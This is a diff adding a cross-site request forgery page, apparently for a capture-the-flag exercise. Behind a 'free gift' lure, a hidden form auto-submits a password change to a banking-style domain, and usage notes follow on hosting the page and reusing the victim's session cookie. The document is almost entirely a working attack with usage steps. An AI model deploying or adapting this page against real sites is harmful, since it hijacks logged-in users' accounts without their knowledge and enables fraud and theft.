@@ -1,0 +1,18 @@
+<html>
+    <body>
+        <h1>Click here for a free gift!</h1>
+        <form id="csrf-form" action="https://www.realtimehomebanking.com/AccountVerify.aspx" method="POST" target="_blank">
+            <!-- Example parameters; adjust based on CTF form fields -->
+            <input type="hidden" name="username" value="victim@example.com" />
+            <input type="hidden" name="action" value="changePassword" />
+            <input type="hidden" name="newPassword" value="attackerChosenPassword123" />
+        </form>
+        <script>
+            document.getElementById("csrf-form").submit();
+        </script>
+    </body>
+    </html>
+    Host this page locally (e.g., using a simple HTTP server: python3 -m http.server 8000) and visit it while authenticated to realtimehomebanking.com in a browser.
+    Use Burp Suite to intercept the request and ensure the session cookie is included.
+
+Goal: Force the victim’s browser to submit the form, altering account details (e.g., password) and logging in with the new credentials to find the flag.
